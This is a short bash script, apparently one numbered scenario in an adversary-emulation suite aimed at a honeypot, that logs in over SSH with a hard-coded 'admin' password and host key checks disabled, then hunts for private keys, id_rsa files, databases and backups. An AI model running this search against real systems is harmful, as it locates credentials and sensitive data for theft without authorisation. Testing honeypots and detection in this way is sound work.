#!/usr/bin/env bash
# S28 — Sensitive File Search
# Tactic : Collection (TA0009)
# Technique: T1005 Data from Local System
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S28 Sensitive File Search — ${TARGET} ==="
timeout ${TIMEOUT:-45} $SSH "find /etc /home /root /var -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -10; find /var /home /tmp -name '*.db' -o -name '*.sqlite' 2>/dev/null | head -10; find /var /home /tmp -name 'backup*' -o -name '*.bak' 2>/dev/null | head -5; exit 0" && echo "[OK]" || echo "[FAIL]"
